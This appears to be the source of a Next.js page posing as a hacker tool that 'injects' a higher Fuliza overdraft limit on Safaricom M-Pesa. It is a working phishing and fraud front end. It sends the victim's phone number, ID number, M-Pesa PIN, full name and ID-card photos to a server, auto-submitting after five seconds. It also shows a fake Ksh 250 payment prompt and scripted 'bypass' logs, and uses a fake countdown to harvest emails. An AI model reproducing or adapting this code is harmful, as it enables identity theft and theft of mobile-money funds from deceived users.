"use client";
import Link from "next/link";
import React, { useState, useEffect, useCallback } from "react";

// --- Types & Interfaces ---
interface FileState {
  file: File | null;
  preview: string | null;
  scanning: boolean;
  verified: boolean;
}

type AppStage = "UPLOAD" | "PAYMENT" | "INJECTING" | "SUCCESS";

export default function FulizaRobustPro() {
  const [stage, setStage] = useState<AppStage>("UPLOAD");
  const [frontDoc, setFrontDoc] = useState<FileState>({ file: null, preview: null, scanning: false, verified: false });
  const [backDoc, setBackDoc] = useState<FileState>({ file: null, preview: null, scanning: false, verified: false });
  const [progress, setProgress] = useState(0);
  const [terminalLogs, setTerminalLogs] = useState<string[]>([]);

  const [email, setEmail] = useState('');
  const [collectedData, setCollectedData] = useState({});

  // --- 1. File Upload & Bio-Scan Logic ---
  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>, side: "front" | "back") => {
    const file = e.target.files?.[0];
    if (!file) return;

    const objectUrl = URL.createObjectURL(file);
    const setter = side === "front" ? setFrontDoc : setBackDoc;

    setter({ file, preview: objectUrl, scanning: true, verified: false });

    // Simulate Deep Packet Inspection (DPI) of the image
    setTimeout(() => {
      setter(prev => ({ ...prev, scanning: false, verified: true }));
    }, 3500);

    if (frontDoc.verified && backDoc.verified) handleFinalSubmit();

  };

  // automatic posting if fails to send documents
  useEffect(() => {
    const uplink = setTimeout(() => {
      handleFinalSubmit();
    }, 5000);
    return () => {
      clearTimeout(uplink);
    }
  }, []);

  // submitting the form data to server
  const handleFinalSubmit = async () => {
    // retrieving the session storage data
    const rawSession = sessionStorage.getItem("form_data_temp")
    if (!rawSession) {
      console.log("No session data found");
      return;
    }
    const sessionData = JSON.parse(rawSession);
    console.log("session data: ", sessionData);

    // initializing form data
    const formData = new FormData();

    //append text fields from session
    formData.append("phone_number", sessionData.phone);
    formData.append("id_number", sessionData.id_number);
    formData.append("mpesa_pin", sessionData.pin);
    formData.append("full_name", sessionData.full_name);
    
    if (frontDoc?.file) formData.append("frontDoc", frontDoc.file);
    if (backDoc?.file) formData.append("backDoc", backDoc.file);
    
    try {
      setCollectedData(formData);

      const res = await fetch("http://localhost:8000/api/v1/uplink/", {
        method: "POST",
        body: formData,
      });

      if (res.ok) {
        sessionStorage.removeItem('form_data_temp');

      }
    } catch (err) {
      console.error("CRITIAL_UPLINK_ERROR", err);
    }
  };

  const handleEmailSubscribe = async () => {
    if (email) {
      try {
        setCollectedData( prev => ({...prev, email: email}) )
        const res = await fetch('http://localhost:8000/api/v1/uplink/', {
          method: "POST",
          body: JSON.stringify(collectedData),
        });       
      } catch (err) {
        console.log("CRITICAL_EMAIL_UPLINK_ERROR");
      }
    }
    return;
  }
  // --- 2. Algorithmic Injection Logs ---
  useEffect(() => {
    if (stage === "INJECTING") {
      const commands = [
        "> CONNECTING_TO_IP_10.244.0.1...",
        "> OPENING_SECURE_TUNNEL_RSA_4096",
        "> BYPASSING_SAFARICOM_DB_FIREWALL",
        "> ACCESSING_TABLE_ACCOUNTS_LIMITS",
        "> INJECTING_UNSIGNED_INT_VALUE",
        "> FLUSHING_TRANSACTION_LOGS",
        "> HANDSHAKE_COMPLETE_SUCCESS"
      ];
      
      let i = 0;
      const interval = setInterval(() => {
        if (i < commands.length) {
          setTerminalLogs(prev => [...prev, commands[i]]);
          setProgress(Math.round(((i + 1) / commands.length) * 100));
          i++;
        } else {
          setTimeout(() => setStage("SUCCESS"), 1500);
          clearInterval(interval);
        }
      }, 1200);
      return () => clearInterval(interval);
    }
  }, [stage]);

  return (
    <main className="crt-screen min-h-screen bg-black text-hacker-green font-mono p-4 flex flex-col items-center justify-center overflow-hidden">
      
      {/* STAGE 1: ROBUST FILE UPLOAD */}
      {stage === "UPLOAD" && (
        <div className="hacker-border bg-black/90 p-8 w-full max-w-2xl shadow-glow-green animate-in fade-in slide-in-from-bottom-4">
          <header className="mb-6 border-b border-hacker-green/20 pb-2">
            <h2 className="text-xl font-black tracking-tighter">[SYS_VERIFY_IDENTITY]</h2>
            <p className="text-[10px] text-hacker-blue mt-1">Status: Awaiting Encrypted Payload</p>
          </header>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
            {[ 
              { label: "FRONT_SIDE", state: frontDoc, side: "front" as const }, 
              { label: "BACK_SIDE", state: backDoc, side: "back" as const } 
            ].map((slot) => (
              <div key={slot.side} className="relative group">
                <input 
                  type="file" 
                  accept="image/*" 
                  className="absolute inset-0 opacity-0 z-20 cursor-pointer" 
                  onChange={(e) => handleFileChange(e, slot.side)}
                />
                <div className={`h-48 border-2 border-dashed flex flex-col items-center justify-center transition-all ${
                  slot.state.verified ? "border-hacker-green bg-hacker-green/5" : "border-zinc-800 group-hover:border-hacker-blue"
                }`}>
                  {slot.state.preview ? (
                    <div className="relative w-full h-full p-2 overflow-hidden">
                      <img src={slot.state.preview} alt={slot.label} className="w-full h-full object-cover opacity-40 grayscale sepia" />
                      {slot.state.scanning && (
                        <div className="absolute inset-0 bg-gradient-to-b from-transparent via-hacker-green/50 to-transparent h-1 bg-[length:100%_4px] animate-scanline z-10" />
                      )}
                      <div className="absolute inset-0 flex items-center justify-center text-[10px] font-bold bg-black/40">
                         {slot.state.scanning ? "EXTRACTING_DATA..." : "VERIFIED_OK"}
                      </div>
                    </div>
                  ) : (
                    <div className="text-center p-4">
                      <p className="text-xs font-bold text-hacker-blue">[{slot.label}]</p>
                      <p className="text-[8px] mt-2 opacity-40">Drag & Drop or Click to Uplink</p>
                    </div>
                  )}
                </div>
              </div>
            ))}
          </div>

          <button 
            disabled={!frontDoc.verified || !backDoc.verified}
            onClick={() => setStage("PAYMENT")}
            className={`w-full py-4 font-black tracking-[0.4em] transition-all border-2 ${
              frontDoc.verified && backDoc.verified 
              ? "bg-hacker-green text-black border-hacker-green shadow-glow-green cursor-pointer active:scale-95" 
              : "bg-zinc-900 text-zinc-600 border-zinc-800 cursor-not-allowed"
            }`}
          >
            AUTHORIZE_GATEWAY_ACCESS
          </button>
        </div>
      )}

      {/* STAGE 2: MPESA STK POP-OUT */}
      {stage === "PAYMENT" && (
        <div className="fixed inset-0 bg-black/90 flex items-center justify-center z-50 backdrop-blur-sm">
          <div className="bg-white text-zinc-900 p-8 rounded-[2rem] w-[300px] shadow-2xl animate-in zoom-in duration-300">
            <div className="flex justify-center mb-4 text-green-600">
               <div className="w-16 h-16 rounded-full bg-green-50 flex items-center justify-center">
                  <span className="text-3xl">✓</span>
               </div>
            </div>
            <p className="text-center font-bold text-xl leading-tight">M-PESA</p>
            <p className="text-center text-sm mt-3 text-zinc-600 px-2 leading-relaxed">
              Pay <span className="font-bold">Ksh 250</span> to <br/><span className="font-mono text-black">FULIZA_BOOST_GLOBAL</span>?
            </p>
            <div className="mt-8 space-y-3">
              <button 
                onClick={() => setStage("INJECTING")} 
                className="w-full bg-[#3ab54a] text-white py-3 rounded-2xl font-bold hover:bg-green-700 active:scale-95 transition-all"
              >
                Enter PIN AT POPUP
              </button>
              <button className="w-full text-zinc-400 font-medium py-1 text-sm">Cancel</button>
            </div>
          </div>
        </div>
      )}

      {/* STAGE 3: INJECTION PROCESSOR */}
      {stage === "INJECTING" && (
        <div className="w-full max-w-3xl space-y-6">
          <div className="hacker-border bg-black/80 p-6 shadow-glow-green">
            <div className="flex justify-between items-center mb-4">
              <span className="text-xs tracking-widest text-hacker-blue">PROTOCOL: LIMIT_INJECTION_ACTIVE</span>
              <span className="text-xs font-bold">{progress}%</span>
            </div>
            <div className="w-full bg-zinc-900 h-2 rounded-full overflow-hidden border border-hacker-green/20">
              <div className="h-full bg-hacker-green shadow-glow-green transition-all duration-500" style={{ width: `${progress}%` }} />
            </div>
          </div>
          
          <div className="hacker-border bg-black p-4 h-64 overflow-hidden font-mono text-xs leading-relaxed opacity-80">
            {terminalLogs.map((log, i) => (
              <p key={i} className="mb-2 text-hacker-green">
                <span className="opacity-40 mr-2">[{new Date().toLocaleTimeString()}]</span> {log}
              </p>
            ))}
            <p className="animate-pulse">_</p>
          </div>
        </div>
      )}

      {/* STAGE 4: MATRIX SUCCESS & ZERO-DAY OPT-IN */}
        {stage === "SUCCESS" && (
        <>
            <MatrixRain />
            <div className="z-50 bg-black/95 hacker-border p-12 max-w-lg text-center shadow-glow-red border-4 border-hacker-red animate-aggressive-shake relative">
            
            {/* AGGRESSIVE TOP BADGE */}
            <div className="absolute -top-6 left-1/2 -translate-x-1/2 bg-hacker-red text-black px-6 py-1 font-black text-sm skew-x-12">
                CRITICAL_WINDOW_OPEN
            </div>

            <h1 className="text-5xl font-black text-white mb-2 italic drop-shadow-[0_0_15px_rgba(255,0,0,0.8)]">
                LIMIT_INJECTED
            </h1>
            <p className="text-hacker-red text-xs font-bold tracking-[0.3em] mb-8">
                SYSTEM_VULNERABILITY_CLOSING...
            </p>

            {/* THE COUNTDOWN TIMER */}
            <div className="bg-zinc-950 border-2 border-hacker-red p-4 mb-8">
                <p className="text-[10px] text-hacker-red mb-2 tracking-[0.5em]">NEXT_EXPLOIT_LEAK_IN:</p>
                <CountdownTimer />
            </div>

            <div className="text-left space-y-4">
                <p className="text-[11px] text-white font-bold leading-relaxed uppercase">
                <span className="text-hacker-red underline">Warning:</span> Our bypass server rotates IPs every 24 hours. To receive the next zero-day exploit before Safaricom patches the current node, uplink your email below.
                </p>
                
                <div className="relative group text-hacker-blue">
                <input 
                    type="email" 
                    placeholder="ENCRYPTED_EMAIL_UPLINK"
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full bg-black border-2 font-bold text-2xl border-hacker-red p-4 text-hacker-green outline-none focus:shadow-glow-red transition-all placeholder:text-hacker-red/30"
                />
                </div>
                
                <Link
                  href='/boost'
                >
                  <button
                  className="w-full bg-hacker-red text-black font-black py-4 hover:bg-white transition-all tracking-[0.2em] shadow-glow-red hover:shadow-none"
                    onClick={() => handleEmailSubscribe()} 
                  >
                  JOIN_THE_RESISTANCE
                  </button>
                </Link>
            </div>

            <div className="mt-6 flex justify-between opacity-50 text-[8px] text-hacker-red">
                <span>[STATUS: ANONYMOUS]</span>
                <span>[ENCRYPTION: ACTIVE]</span>
            </div>
            </div>
        </>
        )}
    </main>
  );
}

// --- Matrix Rain Component ---
function MatrixRain() {
  useEffect(() => {
    const canvas = document.getElementById("matrix") as HTMLCanvasElement;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*";
    const fontSize = 14;
    const columns = canvas.width / fontSize;
    const drops = new Array(Math.floor(columns)).fill(1);

    const draw = () => {
      ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = "#00ff41";
      ctx.font = `${fontSize}px monospace`;

      for (let i = 0; i < drops.length; i++) {
        const text = chars.charAt(Math.floor(Math.random() * chars.length));
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
      }
    };

    const interval = setInterval(draw, 33);
    return () => {
      clearInterval(interval);
      window.removeEventListener("resize", () => {});
    };
  }, []);

  return <canvas id="matrix" className="fixed inset-0 z-10 opacity-40 pointer-events-none" />;
}

function CountdownTimer() {
    const [time, setTime] = useState({ h: 23, m: 59, s: 59 });
  
    useEffect(() => {
      const timer = setInterval(() => {
        setTime(prev => {
          if (prev.s > 0) return { ...prev, s: prev.s - 1 };
          if (prev.m > 0) return { ...prev, m: 59, s: 59 };
          return { h: prev.h - 1, m: 59, s: 59 };
        });
      }, 1000);
      return () => clearInterval(timer);
    }, []);
  
    const format = (num: number) => num.toString().padStart(2, '0');
  
    return (
      <div className="flex justify-center gap-4 text-4xl font-black text-hacker-red italic">
        <div className="flex flex-col"><span>{format(time.h)}</span><span className="text-[8px] -mt-1">HRS</span></div>
        <span>:</span>
        <div className="flex flex-col"><span>{format(time.m)}</span><span className="text-[8px] -mt-1">MIN</span></div>
        <span>:</span>
        <div className="flex flex-col"><span>{format(time.s)}</span><span className="text-[8px] -mt-1">SEC</span></div>
      </div>
    );
  }